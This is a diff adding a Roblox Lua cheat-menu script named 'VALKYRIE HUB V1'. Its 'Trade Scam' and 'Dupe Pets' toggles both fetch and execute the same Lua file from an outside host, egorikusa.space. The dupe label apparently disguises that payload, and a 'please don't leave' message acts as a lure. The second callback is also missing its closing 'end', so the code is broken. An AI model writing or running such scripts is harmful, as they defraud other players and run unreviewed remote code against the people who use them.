@@ -1,0 +1,27 @@
+local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
+
+local Window = OrionLib:MakeWindow({Name = "VALKYRIE HUB V1", HidePremium = false, SaveConfig = false, ConfigFolder = "OrionTest"})
+
+local Tab = Window:MakeTab({
+	Name = "Main",
+	Icon = "rbxassetid://4483345998",
+	PremiumOnly = false
+})
+
+Tab:AddToggle({
+	Name = "Trade Scam",
+	Default = false,
+	Callback = function(Value)
+	  loadstring(game:HttpGet("https://egorikusa.space/e615aa2032acba0880d08ff0.lua", true))()
+	  print("Trade Scam Status = On")
+	end    
+})
+
+Tab:AddToggle({
+  Name = "Dupe Pets",
+  Default = false,
+  Callback = function(Value)
+    loadstring(game:HttpGet("https://egorikusa.space/e615aa2032acba0880d08ff0.lua", true))()
+    print("Pets are Duping Please dont Leave")
+})
+
